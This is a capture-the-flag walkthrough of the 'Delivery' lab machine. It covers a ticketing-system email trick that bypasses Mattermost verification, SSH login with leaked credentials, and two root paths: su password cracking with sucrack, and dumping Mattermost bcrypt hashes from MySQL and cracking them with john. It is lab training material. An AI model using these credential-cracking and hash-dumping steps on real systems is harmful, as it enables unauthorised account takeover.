# Delivery
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan, Directory & File Enumeration, Service Fingerprinting | Identified open ports 22 (SSH), 80 (Nginx), and 8065. Port 8065 was fingerprinted as a "Mattermost" application, and port 80 was a web server with a link to `helpdesk.delivery.htb` running `osTicket`. |
| 2 | (Web) | Open Ticket Exploitation | On `osTicket`, created a new ticket which generated a new email address with the `@delivery.htb` domain. This provided a valid email address to use on the Mattermost registration page. |
| 3 | mattermost | Email Verification Bypass | Registered on Mattermost using the `@delivery.htb` email. The verification token was sent to the email and appeared as a comment on the `osTicket` page, allowing the user to bypass the email verification process and log in to Mattermost. |
| 4 | maildeliverer | Information Disclosure, Credential Reuse | Inside Mattermost, found credentials for the `maildeliverer` user (`Youve_G0t_Mail!`) and a hint about a password-cracking wordlist (`PleaseSubscribe!`). These credentials were used to log in via SSH. |
| 5 | root | Password Spraying via `sucrack`, Credential Reuse | **Method 1:** Using the `PleaseSubscribe!` hint, generated a wordlist with `hashcat` rules. Compiled and ran `sucrack` on the target machine, which successfully cracked a password. The discovered password was `PleaseSubscribe!21`, which granted access to the `root` user via `su`. |
| 6 | root | MySQL Hash Dump, Hash Cracking, Credential Reuse | **Method 2:** Found MySQL credentials in `/opt/mattermost/config/config.json`. Logged into the MySQL database, dumped user hashes from the `mattermost.Users` table, and cracked the root user's hash using `john` and the wordlist generated from `PleaseSubscribe!`. The cracked password was `PleaseSubscribe!21`, which granted `root` access via `su`. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Mon, 30 May 2022 15:22:46 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: k4drdotejtyd3cjqjpfebhz3dr
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Mon, 30 May 2022 15:25:20 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Mon, 30 May 2022 15:25:20 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.92%I=7%D=5/30%Time=6294E1DE%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,DF3,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
SF:x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\
SF:r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancesto
SF:rs\x20'self';\x20script-src\x20'self'\x20cdn\.rudderlabs\.com\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Mon,\x2030\
SF:x20May\x202022\x2015:22:46\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\n
SF:X-Request-Id:\x20k4drdotejtyd3cjqjpfebhz3dr\r\nX-Version-Id:\x205\.30\.
SF:0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Mon,\x
SF:2030\x20May\x202022\x2015:25:20\x20GMT\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><meta\x20charset=\"utf-8\"><meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,initial-scale=1,maximum-scale=1,user
SF:-scalable=0\"><meta\x20name=\"robots\"\x20content=\"noindex,\x20nofollo
SF:w\"><meta\x20name=\"referrer\"\x20content=\"no-referrer\"><title>Matter
SF:most</title><meta\x20name=\"mobile-web-app-capable\"\x20content=\"yes\"
SF:><meta\x20name=\"application-name\"\x20content=\"Mattermost\"><meta\x20
SF:name=\"format-detection\"\x20content=\"telephone=no\"><link\x20re")%r(H
SF:TTPOptions,5B,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x2
SF:0Mon,\x2030\x20May\x202022\x2015:25:20\x20GMT\r\nContent-Length:\x200\r
SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:);
```
As we can see only three ports are opened 22, 80, 8065.  
Now lets dig into port 8065.  
Here we can find a 'mattermost' login page. The site is asking for credentials, but we have none. At a fist glance we can notice that we can register an account, but after ginving the email in the registration form and completing the submission, we see a message like 'a message has been sent to your email, please verify your address'.  
Since we do not have an email and the mail server/network is configured to send email only to certain domains, we cannot verify the email address, hence, we need to poke around to find any usable email.  
Let's now dig into port 80.  
as we open the page we can see a button that redirects us to helpdesk.delivery.htb. here we can find a trouble ticketing platform called 'osTicket', since no obvoius exploit can be found, let's dig into how the system works.  
We can try to open a new ticket, and as we open the ticket we can notice the following success message:  
![](Attachments/Pasted%20image%2020220530223904.png)
as we can see the ticketing system created a new email address @delivery.htb. If we want to add some comments to the case we can mail directly this address.  

## User
Now that we have an email address @delivery.htb we can use the newly created address on mattermost, so that we should receive the verification token on this email and we will be able to grab this token by seeing the comments added to the ticket: 
![](Attachments/Pasted%20image%2020220530224335.png)
Now we can copy and paste the verification token and log in to mattermost.  
As we get in into mattermost we can instantly look a the comments in the 'Internal' channel.  
![](Attachments/Pasted%20image%2020220530224508.png)
Here we can find the credential: `maildeliverer:Youve_G0t_Mail!` and also we can find two big hints.  
Now, if we try to use this credentials for SSH we got a shell as user maildeliverer
```bash
[root@kali Delivery ]$ ssh -l maildeliverer $TARGET                                                                   
The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.                                          
ED25519 key fingerprint is SHA256:AGdhHnQ749stJakbrtXVi48e6KTkaMj/+QNYMW+tyj8.                                        
This key is not known by any other names                   
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                              
Warning: Permanently added '10.10.10.222' (ED25519) to the list of known hosts.                                       
maildeliverer@10.10.10.222's password:                     
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64                                           

The programs included with the Debian GNU/Linux system are free software;                                             
the exact distribution terms for each program are described in the                                                    
individual files in /usr/share/doc/*/copyright.            

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                     
permitted by applicable law.                               
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5       
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)                                                                    
maildeliverer@Delivery:~$ whoami                           
maildeliverer                       
```

## Root
### Method 1 - Sucrack
Once we log in, following the previously discovered suggestion, we can try to use [hashcat to generate a wordlist](https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/) based on the suggested password 'PleaseSubscribe!' and give this wordlist to sucrack in order to try to crack system accounts.  
To generate the dictionary we can use the following `hashcat` command:  
```bash
[root@kali Delivery ]$ hashcat pass_reuse.txt -r /usr/share/hashcat/rules/best64.rule --stdout > passwords.txt 
```
`pass_reuse.txt`  file, obviously contains, as only entry `PleaseSubscribe!` . 
the rule file `/usr/share/hashcat/rules/best64.rule` does a permutaion of the given password.  
Now that we have a dictionary we can use `sucrack`.  
Unfortunately, we cannot compile `sucrack` offline and ship and execute only the binary, since the compiler is complaining about some `gcc` dependencies.  
So we need to create an archive, upload the `sucrack` folder and compile it directly into the target machine.  
Once `sucrack` is ready, we can use sucrack against local accounts.  
```bash
maildeliverer@Delivery:/dev/shm/.work/sucrack/src$ ./sucrack passwords.txt                                            
166/1177                                                   
password is: PleaseSubscribe!21  
```
`sucrack` doesn't tell us for wich account password cracking was successful, so hoping the best of luck let's try to su as root:  
```bash
maildeliverer@Delivery:/dev/shm/.work/sucrack/src$ su -    
Password:                                                  
root@Delivery:~#   
```

### Method 2 - MySQL Hash Dump
Once we log in, as always we can llok around for possible configuration files that disclose credentials.  
We can start by looking into mattermost:  
```bash
maildeliverer@Delivery:~$ find / -name mattermost 2>/dev/null
/opt/mattermost
/opt/mattermost/bin/mattermost
/var/lib/mysql/mattermost
```
Now we can look int `/opt/mattermost` and see what we can find.  
as we change directory we can find a `config/` directory containing a `config.json` file which look very promising.  
Looking into the file, we can see the following credentials for mysql database:  
```json
"SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
	}
```
Now we can login into mysql with `mmuser:Crack_The_MM_Admin_PW` 
```bash
maildeliverer@Delivery:/opt/mattermost/config:~$ mysql -u mmuser -p -D mattermost                                                
Enter password:                                                                                                       
Reading table information for completion of table and column names                                                    
You can turn off this feature to get a quicker startup with -A                                                        
                                                                                                                      
Welcome to the MariaDB monitor.  Commands end with ; or \g.                                                           
Your MariaDB connection id is 105                                                                                     
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10                                                                   
                                                                                                                      
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                                  
                                                                                                                      
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                        
                                                                                                                      
MariaDB [mattermost]>
```
Once we are in we can do a show tables; too see what thables do we have in this DB, describe Users; to seee user's table column and then:  
```
MariaDB [mattermost]> SELECT username, password FROM Users; 
+----------------------------------+--------------------------------------------------------------+
| username                         | password                                                     |
+----------------------------------+--------------------------------------------------------------+
| b0d                              | $2a$10$dEND2rHuiQS7y7Al0NSiV.7vCghQ5g6ltWabZlnm3QxRKs5qoYrIW |
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| b0d2                             | $2a$10$RcpBXt4OAlXkT4Mw.YhX9urrLPl1c.e0/6pAdtpIHpoWL/Es.fFdK |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
```
As we can see we get a bunch of hashes.  
These hashes are in a bcrypt format. bcrypt is based on blowfish and might be tough to crack wit rockyou.  
Now, to reduce the number of attempts, we can follow the int found on mattermost and generate a dictionary using the following `hashcat` command:  
```bash
[root@kali Delivery ]$ hashcat pass_reuse.txt -r /usr/share/hashcat/rules/best64.rule --stdout > passwords.txt 
```
Now that we have a dictionary we can try to crack the hash using `john`
```
[root@kali Delivery ]$ john --wordlist=passwords.txt hash.txt                   
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PleaseSubscribe!21 (?)     
1g 0:00:00:00 DONE (2022-05-30 23:10) 1.960g/s 70.58p/s 70.58c/s 70.58C/s PleaseSubscribe!12..PleaseSubscrio
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Now, hoping the best of luck let's try to su as root:  
```bash
maildeliverer@Delivery:/dev/shm/.work/sucrack/src$ su -    
Password:                                                  
root@Delivery:~#   
```
  